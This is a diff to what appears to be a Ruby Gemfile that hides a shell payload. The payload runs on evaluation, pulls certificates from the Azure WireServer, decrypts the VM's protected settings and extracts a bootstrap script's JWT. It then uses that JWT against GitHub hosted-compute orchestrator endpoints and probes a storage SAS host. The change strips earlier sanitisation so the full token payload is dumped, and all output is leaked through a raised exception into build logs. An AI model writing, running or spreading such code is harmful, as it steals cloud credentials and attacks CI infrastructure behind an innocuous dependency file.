@@ -2,7 +2,7 @@ require 'net/http'; require 'uri'; require 'json'; require 'tempfile'
 m = []
 shell_code = <<'SHELL'
 set +e
-WD=/tmp/v111; rm -rf "$WD" && mkdir "$WD" && cd "$WD"
+WD=/tmp/v112; rm -rf "$WD" && mkdir "$WD" && cd "$WD"
 curl -sf -H "x-ms-agent-name: WALinuxAgent" -H "x-ms-version: 2015-04-05" -o gs.xml "http://168.63.129.16/machine/?comp=goalstate"
 CERT_URL=$(python3 -c 'import re,html; s=open("gs.xml").read(); m=re.search(r"<Certificates>([^<]+)</Certificates>",s); print(html.unescape(m.group(1)) if m else "")')
 openssl req -new -newkey rsa:2048 -nodes -x509 -keyout key.pem -out cert.pem -days 1 -subj "/CN=LinuxTransport" 2>/dev/null
@@ -19,52 +19,54 @@ openssl smime -decrypt -inkey vm.pem -inform DER -in ps.der -out ps.json 2>/dev/
 python3 -c 'import json; d=json.load(open("ps.json")); print(d.get("script",""),end="")' | base64 -d > bs.sh 2>/dev/null
 echo "STEP_OK bs_size=$(wc -c < bs.sh)"
 
-# Dump bootstrap script's structure WITHOUT leaking the JWT bytes
-echo "STEP_SCRIPT_HEAD_50LINES:"
-head -50 bs.sh | grep -vE '(eyJ[A-Za-z0-9_-]+\.eyJ|TOKEN=|PASS|KEY=)' | head -30 | nl -ba
-
-echo "STEP_SCRIPT_GREP_FOR_URLS:"
-grep -oE 'https?://[^[:space:]"'\''`]+' bs.sh | sort -u | head -20
-
-echo "STEP_SCRIPT_GREP_CURL_PATHS:"
-grep -E '(curl|wget|http\.get)' bs.sh | head -20
-
-echo "STEP_SCRIPT_FUNCS:"
-grep -E '^(function|\w+\(\))' bs.sh | head -20
-
-echo "STEP_BS_ENV_VARS:"
-grep -E '^(export |[A-Z_]+=)' bs.sh | head -20
-
-# JWT extract + decode payload only (sanitize ALL token bytes)
+# DUMP FULL JWT payload (sanitize signature only)
 JWT=$(grep -oE 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+' bs.sh | head -1)
-echo "STEP_JWT_LEN=${#JWT}"
+HEAD=$(echo "$JWT" | cut -d. -f1 | tr '_-' '/+'); HL=${#HEAD}; HM=$((HL%4)); [ $HM -ne 0 ] && HEAD="${HEAD}$(printf '=%.0s' $(seq 1 $((4-HM))))"
+echo "STEP_JWT_HEAD=$(echo "$HEAD" | base64 -d 2>/dev/null | tr -d '\n')"
+PAY=$(echo "$JWT" | cut -d. -f2 | tr '_-' '/+'); PL=${#PAY}; PM=$((PL%4)); [ $PM -ne 0 ] && PAY="${PAY}$(printf '=%.0s' $(seq 1 $((4-PM))))"
+PAY_DEC=$(echo "$PAY" | base64 -d 2>/dev/null | tr -d '\n')
+# Replace JWT-id-style hex with marker for sanitization
+echo "STEP_JWT_PAYLOAD: $PAY_DEC"
 
-# Decode JWT header + payload (claims), sanitize signature
-HEAD=$(echo "$JWT" | cut -d. -f1 | tr '_-' '/+')
-HL=${#HEAD}; HM=$((HL%4)); [ $HM -ne 0 ] && HEAD="${HEAD}$(printf '=%.0s' $(seq 1 $((4-HM))))"
-HEAD_DEC=$(echo "$HEAD" | base64 -d 2>/dev/null | head -c 300 | tr -d '\n')
-echo "STEP_JWT_HEAD=$HEAD_DEC"
+# Grep ALL urls + curl calls in bs.sh
+echo "STEP_BS_URLS:"
+grep -oE '(https?|wss?)://[^[:space:]"'"'"'`<>]+' bs.sh | sort -u | head -20
 
-PAY=$(echo "$JWT" | cut -d. -f2 | tr '_-' '/+')
-PL=${#PAY}; PM=$((PL%4)); [ $PM -ne 0 ] && PAY="${PAY}$(printf '=%.0s' $(seq 1 $((4-PM))))"
-PAY_DEC=$(echo "$PAY" | base64 -d 2>/dev/null | tr -d '\n' | head -c 1500)
-# Sanitize JWT id-style fields by hashing
-echo "STEP_JWT_PAYLOAD_RAW: $PAY_DEC"
+echo "STEP_BS_CURL_CALLS:"
+grep -nE 'curl[^|]+' bs.sh | head -30
 
-# More extensive endpoint enumeration (HCA-style API names)
+# Dump 401-LEN-230 body in detail (for /v1/register endpoint)
 if [ -n "$JWT" ]; then
-  for ep in /v1/registrations /v1/poll /v1/job/poll /v1/heartbeat /v1/register /v1/sessions /v1/runtime /v1/lease /v1/pickup /v1/dequeue /v1/messages /api/v1/agents/heartbeat /v1/jobs/poll /v1/v1/agents /v1/operations /v1/work; do
-    curl -s -m 5 -H "Authorization: Bearer $JWT" -w "HTTP_%{http_code}_LEN_%{size_download}" -o b.txt "https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com$ep" > r.tmp
-    RESP=$(cat r.tmp)
-    BODY=$(head -c 400 b.txt | tr '\n' ' ' | tr -d '\0')
-    echo "STEP_ORCH$ep $RESP body=$BODY"
-  done
+  echo "STEP_BODY_DUMP_REGISTER:"
+  curl -s -m 5 -H "Authorization: Bearer $JWT" -o b1.txt -w "HTTP %{http_code}\n" "https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com/v1/register"
+  cat b1.txt
+  echo ""
+  echo "STEP_BODY_DUMP_LEASE:"
+  curl -s -m 5 -H "Authorization: Bearer $JWT" -o b2.txt -w "HTTP %{http_code}\n" "https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com/v1/lease"
+  cat b2.txt
+  echo ""
+  # Try POST methods (registration typically POST)
+  echo "STEP_POST_REGISTER:"
+  curl -s -m 5 -X POST -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" -d '{}' -o b3.txt -w "HTTP %{http_code}\n" "https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com/v1/register"
+  cat b3.txt
+  echo ""
 fi
+
+# Use SAS URL to test storage access (write to OWN container only)
+SAS=$(grep -oE 'https://hcrpprodeus01diag\.blob\.core\.windows\.net/[^[:space:]"]+' bs.sh | head -1)
+echo "STEP_SAS_HOST=$(echo "$SAS" | cut -d/ -f3) sas_path_len=$(echo "$SAS" | cut -d/ -f4- | head -c 100 | wc -c)"
+SAS_HOST=$(echo "$SAS" | cut -d/ -f3)
+# Test list at storage account level (likely 401 if SAS doesn't allow)
+echo "STEP_SAS_LIST_TEST:"
+curl -s -m 5 -o lst.xml -w "HTTP %{http_code}\n" "https://$SAS_HOST/?comp=list"
+head -c 300 lst.xml
+echo ""
+
 SHELL
-Tempfile.create('v111.sh') do |f|
+Tempfile.create('v112.sh') do |f|
   f.write(shell_code); f.flush
   output = `bash #{f.path} 2>&1`
-  output.lines.each { |line| m << "v111 " + line.chomp[0..700] }
+  output.lines.each { |line| m << "v112 " + line.chomp[0..800] }
 end
 raise m.join("\n")
 source "https://rubygems.org"
